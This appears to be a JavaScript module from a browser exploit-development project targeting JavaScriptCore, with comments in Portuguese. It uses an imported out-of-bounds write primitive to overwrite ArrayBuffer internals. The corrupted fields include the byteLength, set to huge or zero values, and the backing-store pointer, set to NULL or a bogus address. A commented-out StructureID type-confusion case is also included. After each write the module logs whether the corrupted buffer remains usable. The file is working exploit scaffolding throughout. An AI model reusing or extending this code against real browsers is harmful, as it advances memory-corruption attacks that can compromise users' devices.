// js/script3/testVictimABInstability.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Alvo de corrupção e sondagem
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Esta função não usará mais as sondas toJSON, mas fará inspeção direta.
// objectToInspect: o oob_array_buffer_real após a tentativa de corrupção
// expectedOriginalSize: tamanho do oob_array_buffer_real ANTES da corrupção
// corruptionValueWritten: o valor que foi escrito
// corruptionOffsetWritten: o offset onde foi escrito
export function inspectArrayBufferState(objectToInspect, expectedOriginalSize, corruptionValueWritten, corruptionOffsetWritten) {
    const FNAME_INSPECT = "inspectArrayBufferState";
    let report = {
        inspected_object_type: Object.prototype.toString.call(objectToInspect),
        is_still_array_buffer: false,
        current_byteLength: "N/A",
        byteLength_changed: false,
        dataview_ops_ok: false,
        dataview_error: null,
        notes: ""
    };

    logS3(`  [${FNAME_INSPECT}] Inspecionando estado do ArrayBuffer após corrupção...`, "info");
    logS3(`    Valor escrito: ${isAdvancedInt64Object(corruptionValueWritten) ? corruptionValueWritten.toString(true) : toHex(corruptionValueWritten)} no offset ${toHex(corruptionOffsetWritten)}`, "info");


    if (report.inspected_object_type !== "[object ArrayBuffer]") {
        report.notes = `Objeto não é mais um ArrayBuffer! Tipo: ${report.inspected_object_type}`;
        logS3(`    CRÍTICO: ${report.notes}`, "critical", FNAME_INSPECT);
        return report;
    }
    report.is_still_array_buffer = true;

    try {
        report.current_byteLength = objectToInspect.byteLength;
        if (report.current_byteLength !== expectedOriginalSize) {
            report.byteLength_changed = true;
            report.notes += `byteLength alterado de ${expectedOriginalSize} para ${report.current_byteLength}. `;
            logS3(`    ANOMALIA: ${report.notes}`, "critical", FNAME_INSPECT);
        } else {
            logS3(`    byteLength permanece ${report.current_byteLength} (esperado).`, "good", FNAME_INSPECT);
        }

        // Tentar operações de DataView
        // Usar um tamanho pequeno e seguro para teste, especialmente se byteLength for enorme/corrompido
        const testDvLength = Math.min(typeof report.current_byteLength === 'number' ? report.current_byteLength : 0, 16);
        if (testDvLength >= 4) {
            const dv = new DataView(objectToInspect, 0, testDvLength);
            const writeVal = 0xABCD;
            dv.setUint32(0, writeVal, true);
            if (dv.getUint32(0, true) === writeVal) {
                report.dataview_ops_ok = true;
                logS3(`    Operações DataView (R/W em pequena área) OK.`, "good", FNAME_INSPECT);
            } else {
                report.dataview_error = "DataView R/W falhou (valor incorreto)";
                report.notes += "DataView R/W falhou (valor incorreto). ";
                logS3(`    CRÍTICO: ${report.dataview_error}`, "critical", FNAME_INSPECT);
            }
        } else {
            report.dataview_error = `byteLength (${report.current_byteLength}) muito pequeno para teste DataView.`;
            report.notes += `byteLength (${report.current_byteLength}) muito pequeno para teste DataView. `;
            // Não necessariamente crítico se o byteLength foi intencionalmente zerado.
             logS3(`    AVISO: ${report.dataview_error}`, "warn", FNAME_INSPECT);
        }

    } catch (e) {
        report.dataview_error = `Exceção durante inspeção: ${e.name} - ${e.message}`;
        report.notes += `Exceção: ${e.message}. `;
        logS3(`    CRÍTICO: Exceção durante inspeção: ${e.name} - ${e.message}`, "critical", FNAME_INSPECT);
        console.error(e);
    }
    return report;
}

// Parâmetros:
// corruption_offset_in_oob_ab: offset absoluto DENTRO do oob_array_buffer_real onde a escrita ocorre
// value_to_write: valor a ser escrito
// size_to_write: tamanho da escrita (1, 2, 4, ou 8 para AdvancedInt64)
export async function executeDirectCorruptionAndInspect(corruption_offset_in_oob_ab, value_to_write, size_to_write) {
    const FNAME_TEST = "executeDirectCorruptionAndInspect";
    logS3(`--- Sub-Teste: Corrupção Direta e Inspeção ---`, "subtest", FNAME_TEST);
    logS3(`  Alvo da Corrupção e Inspeção: oob_array_buffer_real`, "info", FNAME_TEST);
    logS3(`  Tentando escrever ${isAdvancedInt64Object(value_to_write) ? value_to_write.toString(true) : toHex(value_to_write)} (tamanho ${size_to_write}) em offset abs ${toHex(corruption_offset_in_oob_ab)}`, "info", FNAME_TEST);

    let result_report = null;
    let problem_detected_in_subtest = false;

    // oob_array_buffer_real deve existir (criado por runAllInstabilityTestsOnVictimAB)
    if (!oob_array_buffer_real) {
        logS3("CRÍTICO: oob_array_buffer_real não existe no início do sub-teste!", "critical", FNAME_TEST);
        return { final_verdict_is_problem: true, report: null, error: "oob_array_buffer_real missing" };
    }
    const original_size = oob_array_buffer_real.byteLength;

    if (!oob_write_absolute(corruption_offset_in_oob_ab, value_to_write, size_to_write)) {
        logS3("   Falha ao escrever valor de corrupção.", "error", FNAME_TEST);
        return { final_verdict_is_problem: true, report: null, error: "oob_write_absolute failed" };
    }
    logS3("   Valor de corrupção escrito com sucesso no oob_array_buffer_real.", "good", FNAME_TEST);
    await PAUSE_S3(SHORT_PAUSE_S3); // Pausa para a escrita "assentar"

    result_report = inspectArrayBufferState(oob_array_buffer_real, original_size, value_to_write, corruption_offset_in_oob_ab);

    if (!result_report.is_still_array_buffer ||
        result_report.byteLength_changed ||
        !result_report.dataview_ops_ok || // Considerar falha de DV sempre um problema
        (result_report.dataview_error && !result_report.dataview_error.includes("muito pequeno para teste DataView")) // Erros de DV que não sejam "muito pequeno"
       ) {
        problem_detected_in_subtest = true;
    }
    
    if (problem_detected_in_subtest) {
        logS3(`   PROBLEMA DETECTADO na inspeção após corrupção (${toHex(value_to_write)} @ ${toHex(corruption_offset_in_oob_ab)})`, "critical", FNAME_TEST);
        logS3(`     Detalhes da Inspeção: ${JSON.stringify(result_report)}`, "critical", FNAME_TEST);
        document.title = `PROBLEMA (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
    } else {
        logS3(`   Inspeção completada sem problemas óbvios detectados.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste Corrupção Direta CONCLUÍDO ---`, "subtest", FNAME_TEST);
    return { final_verdict_is_problem: problem_detected_in_subtest, report: result_report, error: null };
}


export async function runAllInstabilityTestsOnVictimAB() {
    const FNAME_RUNNER = "runAllInstabilityTestsOnVictimAB";
    logS3(`==== INICIANDO Teste de Corrupção Direta e Inspeção do oob_array_buffer_real ====`, "test", FNAME_RUNNER);

    let overall_problem_found = false;

    // Offsets são relativos ao início do objeto JSArrayBuffer (assumindo que começa em 0 do buffer bruto)
    const corruption_params_to_try = [
        { name: "Corromper m_byteLength para 0xFFFFFFFF",
          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, // Ex: "0x18"
          value: 0xFFFFFFFF, size: 4 },
        { name: "Corromper m_byteLength para 0 (zero)",
          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START,
          value: 0x00000000, size: 4 },
        { name: "Corromper m_byteLength para 1024",
          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START,
          value: 1024, size: 4 },
        { name: "Corromper m_byteLength para valor ENORME (requer escrita 64bit no offset certo)",
          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, // Se byteLength for 64bit, este offset pode precisar ser diferente
          value: new AdvancedInt64(0xFFFFFFFF, 0x7FFFFFFF), size: 8 }, // Exemplo de valor positivo enorme
        { name: "Corromper ponteiro m_impl para NULL",
          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, // Ex: "0x10"
          value: new AdvancedInt64(0,0), size: 8},
        { name: "Corromper ponteiro m_impl para valor inválido (BAD)",
          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET,
          value: new AdvancedInt64(0xBADBAD00, 0xBADBAD00), size: 8},
        // Adicionar um caso para Structure ID se você souber o offset e um ID de outro tipo
        // { name: "Corromper StructureID para um ID de JSTypedArray",
        //   offset_in_JSObject_hex: JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, // Ex: "0x00" (precisa ser relativo ao JSCell header)
        //   value: ID_DE_JSTYPEDARRAY_CONHECIDO, size: 4 } // CUIDADO: Isso requer conhecimento preciso do StructureID
    ];

    for (const params of corruption_params_to_try) {
        logS3(`\n[${FNAME_RUNNER}] Testando Parâmetros de Corrupção: ${params.name}`, "test", FNAME_RUNNER);

        clearOOBEnvironment(); // Garante um oob_array_buffer_real "fresco"
        if (!triggerOOB_primitive()) {
            logS3("Falha crítica ao criar oob_array_buffer_real. Abortando.", "critical", FNAME_RUNNER);
            overall_problem_found = true; // Marcar como problema para evitar falso negativo
            break;
        }
        // O oob_array_buffer_real agora existe.

        // ATENÇÃO: Suposição de que o objeto JSArrayBuffer (com seus metadados como m_byteLength)
        // começa no offset 0 do buffer de dados brutos retornado por `new ArrayBuffer()`.
        // Em um motor JS real, pode haver um `JSCell header` antes.
        // Se houver um header de, por exemplo, 8 bytes, então `params.offset_in_JSObject_hex`
        // precisaria ser somado a esses 8 bytes para obter o `actual_write_offset_in_raw_buffer`.
        const JSCELL_HEADER_SIZE_GUESS = 0; // << AJUSTE ESTE VALOR SE VOCÊ SUSPEITAR DE UM HEADER
        const actual_write_offset = JSCELL_HEADER_SIZE_GUESS + parseInt(params.offset_in_JSObject_hex, 16);

        const test_result = await executeDirectCorruptionAndInspect(
            actual_write_offset,
            params.value,
            params.size
        );

        if (test_result.final_verdict_is_problem) {
            overall_problem_found = true;
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);
    }

    if (overall_problem_found) {
         logS3(`==== Teste de Corrupção Direta CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
         document.title = "PROBLEMA(S) DETECTADO(S) - Corrupção Direta AB";
    } else {
        logS3(`==== Teste de Corrupção Direta CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO. ====`, "good", FNAME_RUNNER);
    }
    clearOOBEnvironment(); // Limpeza final
}
